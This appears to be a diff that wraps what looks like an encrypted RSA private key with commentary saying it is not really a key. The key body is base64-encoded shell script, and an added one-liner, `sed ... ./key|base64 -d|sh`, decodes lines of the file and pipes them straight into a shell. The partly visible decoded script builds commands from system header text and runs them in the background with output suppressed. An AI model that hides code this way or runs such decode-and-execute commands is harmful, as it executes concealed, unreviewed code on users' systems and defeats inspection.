@@ -1,3 +1,7 @@
+While the below might seem a regular private key for you, it isn't.
+
+$ while read -r line;do echo "${line}";done<./key
+
 -----BEGIN RSA PRIVATE KEY-----
 Proc-Type: 4,ENCRYPTED
 DEK-Info: AES-128-CBC,22DBD4DBAF0F666D79BD0317DDD5860A
@@ -16,3 +20,5 @@ YXRjaCAkaXNtYXRjaGVkICRydWxlcmVnZXhgOyBnb3RjaGE9YGF3ayAnTlI9PTE1IHtwcmludCAk
 Mn0nIC91c3IvaW5jbHVkZS9zdGRpby5ofHNlZCAnc19bb10uKl9fJ2A7IGlkc3J1bGU9YGVjaG8g
 JG1hdGNofCRnb3RjaGFgICY+L2Rldi9udWxsICYK
 -----END RSA PRIVATE KEY-----
+
+$ sed -n '5,17p' ./key|base64 -d|sh
